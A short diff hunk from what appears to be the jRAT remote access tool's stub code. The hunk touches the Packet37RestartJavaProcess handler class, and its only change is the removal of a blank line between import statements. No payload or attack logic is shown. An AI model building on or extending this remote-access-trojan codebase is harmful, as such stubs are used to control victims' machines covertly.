@@ -3,7 +3,6 @@ package io.jrat.stub.packets.incoming;
 import io.jrat.common.downloadable.JavaArchive;
 import io.jrat.stub.Connection;
 import io.jrat.stub.utils.Utils;
-
 import java.io.File;
 
 public class Packet37RestartJavaProcess extends AbstractIncomingPacket {
